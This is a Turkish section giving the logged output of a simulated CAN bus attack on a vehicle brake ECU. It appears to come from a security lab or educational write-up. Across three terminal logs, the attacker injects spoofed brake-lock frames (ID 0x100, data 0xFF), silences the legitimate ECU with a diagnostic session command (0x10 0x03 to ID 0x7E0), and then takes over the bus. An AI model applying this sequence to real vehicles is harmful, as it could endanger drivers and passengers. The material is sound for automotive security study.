---

### 3. Simülasyon Çıktıları

```markdown
# Simülasyon Test Sonuçları: ECU Susturma ve Manipülasyon

**Test Tarihi:** 02.01.2026  
**Senaryo:** Güvensiz CAN Mesaj Mantığı ve ECU Susturma  
**Ortam:** Ubuntu WSL2 / python-can (udp_multicast)

Aşağıdaki loglar, 3 farklı terminalin eş zamanlı çalışması sırasında kaydedilmiştir.

---

### Terminal 1: GÖSTERGE PANELİ (Dashboard) Çıktıları
*(Kullanıcı/Sürücü tarafında görünenler)*

```text
🖥️  GÖSTERGE PANELİ: Veriyolu dinleniyor...
✅ GÜVENLİ: Frenler Serbest (Gelen Veri: 00)
✅ GÜVENLİ: Frenler Serbest (Gelen Veri: 00)
✅ GÜVENLİ: Frenler Serbest (Gelen Veri: 00)
✅ GÜVENLİ: Frenler Serbest (Gelen Veri: 00)
❓ Bilinmeyen Durum: Çelişkili Veri Algılandı!
✅ GÜVENLİ: Frenler Serbest (Gelen Veri: 00)
🚨 TEHLİKE: FRENLER KİLİTLENDİ! (Gelen Veri: ff)
❓ Bilinmeyen Durum: Çelişkili Veri Algılandı!
✅ GÜVENLİ: Frenler Serbest (Gelen Veri: 00)
--- (Kısa bir sessizlik) ---
🚨 TEHLİKE: FRENLER KİLİTLENDİ! (Gelen Veri: ff)
🚨 TEHLİKE: FRENLER KİLİTLENDİ! (Gelen Veri: ff)
🚨 TEHLİKE: FRENLER KİLİTLENDİ! (Gelen Veri: ff)
🚨 TEHLİKE: FRENLER KİLİTLENDİ! (Gelen Veri: ff)


### Terminal 2: MEŞRU ECU (Kurban) Çıktıları
(Aracın kendi fren sistemi)

🟢 MEŞRU ECU: Çalışıyor... (ID: 0x100 - Fren Durumu: SERBEST)
...Normal durum mesajı gönderiliyor (0x00)...
...Normal durum mesajı gönderiliyor (0x00)...
...Normal durum mesajı gönderiliyor (0x00)...
...Normal durum mesajı gönderiliyor (0x00)...
...Normal durum mesajı gönderiliyor (0x00)...

⚠️  KRİTİK HATA: Tanılama komutu (0x7E0) alındı!
⚠️  İçerik: Diagnostic Session Control (0x10 0x03)
🛑 MEŞRU ECU: Güvenlik protokolü gereği Çevrimdışı moda (Sessiz) geçiliyor.
[Sistem Kapatıldı]


### Terminal 3: Terminal 3: SALDIRGAN (Attacker) Çıktıları
(Saldırıyı yapan kod)

💀 SALDIRGAN: Sistem hazır. Saldırı başlatılıyor...

--- AŞAMA 1: Mesaj Enjeksiyonu (Çelişki Yaratılıyor) ---
>> Enjeksiyon başladı: ID 0x100 -> Data 0xFF
>> Enjeksiyon sürüyor...
>> Dashboard'a bak: Hem 'Güvenli' hem 'Tehlike' mesajları karışık gidiyor.

--- AŞAMA 2: Meşru ECU'yu Susturma (Diagnostic Kill) ---
>> Hedef: ID 0x7E0 (Diagnostic Interface)
>> Payload: [0x10, 0x03, 0x00...]
>> 'Susturma' komutu gönderildi!

--- AŞAMA 3: Tam Kontrol (Dominance) ---
>> Meşru ECU sustu. Artık ağda sadece bizim sahte mesajlarımız var.
💀 SALDIRIYOR: Fren Kilitlendi Mesajı Gönderiliyor...
💀 SALDIRIYOR: Fren Kilitlendi Mesajı Gönderiliyor...
💀 SALDIRIYOR: Fren Kilitlendi Mesajı Gönderiliyor...
💀 SALDIRIYOR: Fren Kilitlendi Mesajı Gönderiliyor...
[Saldırı Başarıyla Tamamlandı]